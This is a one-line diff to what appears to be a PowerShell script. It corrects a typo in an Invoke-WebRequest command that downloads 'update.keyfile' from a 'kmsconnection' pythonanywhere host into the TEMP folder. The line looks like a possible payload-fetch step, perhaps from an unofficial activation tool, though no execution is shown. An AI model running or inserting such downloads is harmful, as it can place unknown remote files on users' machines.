@@ -1,1 +1,1 @@
-nvoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/update.keyfile" -OutFile "$env:TEMP\update.keyfile"
+Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/update.keyfile" -OutFile "$env:TEMP\update.keyfile"
